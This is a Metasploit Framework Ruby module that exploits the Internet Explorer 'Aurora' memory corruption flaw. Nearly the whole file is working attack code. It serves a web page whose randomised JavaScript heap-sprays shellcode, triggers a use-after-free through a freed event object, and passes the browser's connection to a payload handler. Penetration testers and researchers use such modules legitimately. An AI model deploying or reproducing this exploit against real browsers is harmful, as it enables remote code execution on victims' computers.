##
# $Id: ie_aurora.rb 8136 2010-01-15 21:36:04Z hdm $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::BrowserAutopwn
	autopwn_info({
		:ua_name    => HttpClients::IE,
		:ua_minver  => "6.0",
		:ua_maxver  => "8.0",
		:javascript => true,
		:os_name    => OperatingSystems::WINDOWS,
		:vuln_test  => nil, # no way to test without just trying it
	})


	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Internet Explorer "Aurora" Memory Corruption',
			'Description'    => %q{
				This module exploits a memory corruption flaw in Internet Explorer. This
			flaw was found in the wild.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'unknown',
					'hdm'      # Metasploit port
				],
			'Version'        => '$Revision: 8136 $',
			'References'     =>
				[
					['URL', 'http://www.microsoft.com/technet/security/advisory/979352.mspx'],
					['URL', 'http://wepawet.iseclab.org/view.php?hash=1aea206aa64ebeabb07237f1e2230d0f&type=js']

				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00",
					'Compat'   =>
						{
							'ConnectionType' => '-find',
						},
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
			'DisclosureDate' => 'Jan 14 2009', # wepawet sample
			'DefaultTarget'  => 0))
	end

	def on_request_uri(cli, request)

		if (request.uri.match(/\.gif/i))
			data = "R0lGODlhAQABAIAAAAAAAAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==".unpack("m*")[0]
			send_response(cli, data, { 'Content-Type' => 'image/gif' })
			return
		end

		var_memory    = rand_text_alpha(rand(100) + 1)
		var_boom      = rand_text_alpha(rand(100) + 1)
		var_x1        = rand_text_alpha(rand(100) + 1)
		var_e1        = rand_text_alpha(rand(100) + 1)
		var_e2        = rand_text_alpha(rand(100) + 1)

		var_comment   = rand_text_alpha(rand(100) + 1);
		var_abc       = rand_text_alpha(3);

		var_ev1       = rand_text_alpha(rand(100) + 1)
		var_ev2       = rand_text_alpha(rand(100) + 1)
		var_sp1       = rand_text_alpha(rand(100) + 1)

		var_unescape  = rand_text_alpha(rand(100) + 1)
		var_shellcode = rand_text_alpha(rand(100) + 1)
		var_spray     = rand_text_alpha(rand(100) + 1)
		var_start     = rand_text_alpha(rand(100) + 1)
		var_i         = rand_text_alpha(rand(100) + 1)

		rand_html     = rand_text_english(rand(400) + 500)

		html = %Q|<html>
<head>
<script>

	var #{var_comment} = "COMMENT";

	var #{var_x1} = new Array();
	for (i = 0; i < 200; i ++ ){
	   #{var_x1}[i] = document.createElement(#{var_comment});
	   #{var_x1}[i].data = "#{var_abc}";
	};

	var #{var_e1} = null;

	var #{var_memory} = new Array();
	var #{var_unescape} = unescape;

	function #{var_boom}() {

		var #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');

		var #{var_spray} = #{var_unescape}( "%" + "u" + "0" + "c" + "0" + "d" + "%u" + "0" + "c" + "0" + "d" );

		do { #{var_spray} += #{var_spray} } while( #{var_spray}.length < 0xd0000 );

		for(#{var_i} = 0; #{var_i} < 100; #{var_i}++) #{var_memory}[#{var_i}] = #{var_spray} + #{var_shellcode};
	}

	function #{var_ev1}(evt){
		#{var_boom}();
	    #{var_e1} = document.createEventObject(evt);
	    document.getElementById("#{var_sp1}").innerHTML = "";
	    window.setInterval(#{var_ev2}, 50);
	}

	function #{var_ev2}(){
	  p = "\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d";
	  for (i = 0; i < #{var_x1}.length; i ++ ){
	      #{var_x1}[i].data = p;
	  }

	  var t = #{var_e1}.srcElement;
	}
</script>
</head>
<body>

<span id="#{var_sp1}"><img src="#{get_resource}#{var_start}.gif" onload="#{var_ev1}(event)"></span></body></html>

</body>
</html>
		|

		# Transmit the compressed response to the client
		send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })

		# Handle the payload
		handler(cli)
	end
end

